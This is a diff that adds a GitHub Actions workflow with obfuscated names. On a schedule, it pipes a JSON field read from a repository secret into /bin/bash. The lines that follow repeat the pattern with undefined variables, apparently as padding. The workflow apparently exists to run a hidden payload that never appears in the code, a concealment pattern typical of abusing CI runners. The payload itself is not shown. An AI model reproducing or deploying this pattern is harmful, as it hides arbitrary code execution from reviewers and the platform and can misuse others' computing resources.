@@ -1,0 +1,32 @@
+name: wideeyedglozing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wideeyedglozing
+        env:
+          lzr82305: ${{ secrets.lzr82305 }}
+        run: |
+          echo $lzr82305 | jq -r .yhd24302 | /bin/bash
+          echo $t842 | jq -r .mep07696 | /bin/bash
+          echo $qdiom0139 | jq -r .og2460 | /bin/bash
+          echo $w428 | jq -r .j2822 | /bin/bash
+          echo $tjfdw12 | jq -r .sv0 | /bin/bash
+          echo $mkwuz15672 | jq -r .kgt2100 | /bin/bash
+          echo $orba726 | jq -r .feav1205 | /bin/bash
+          echo $bye10 | jq -r .poju27358 | /bin/bash
+          echo $ar7975 | jq -r .dyoqf5952 | /bin/bash
+          echo $z27 | jq -r .bj22 | /bin/bash
+          echo $dzu2456 | jq -r .yts2754 | /bin/bash
+          echo $afgi6 | jq -r .u61705 | /bin/bash
+          echo $pv57871 | jq -r .teznx6 | /bin/bash
+          echo $doup1832 | jq -r .gja53276 | /bin/bash
+          echo $h59265 | jq -r .zino22905 | /bin/bash
+          echo $ln96685 | jq -r .pvlnf04906 | /bin/bash
+          echo $l66476 | jq -r .w80 | /bin/bash
+
